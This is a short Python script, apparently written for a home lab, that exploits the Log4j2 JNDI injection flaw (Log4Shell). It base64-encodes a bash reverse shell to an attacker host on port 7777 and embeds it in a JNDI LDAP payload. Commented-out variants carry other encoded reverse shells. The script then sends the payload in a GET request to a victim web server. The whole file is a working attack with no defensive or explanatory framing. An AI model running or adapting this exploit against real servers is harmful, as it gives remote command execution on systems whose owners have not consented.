"""log4j2 JNDI 注入"""

import base64
import urllib.parse

import requests

ATTACKER_HOSTNAME = "kali-attacker.mlab"
VICTIM_HOSTNAME = "ubuntu-victim.mlab"

shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"

shell_redirection_bytes = shell_redirection.encode("ascii")
shell_redirection_b64 = base64.b64encode(shell_redirection_bytes).decode("ascii")

print(f"Encoded string: {shell_redirection_b64}")


params = {
    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
    + urllib.parse.quote_plus(shell_redirection_b64)
    + "}",
}


response = requests.get(
    "http://ubuntu-victim.mlab:8080/hello",
    params=params,
    verify=False,
    timeout=10,
)

print(response.request.url)
print(response.text)
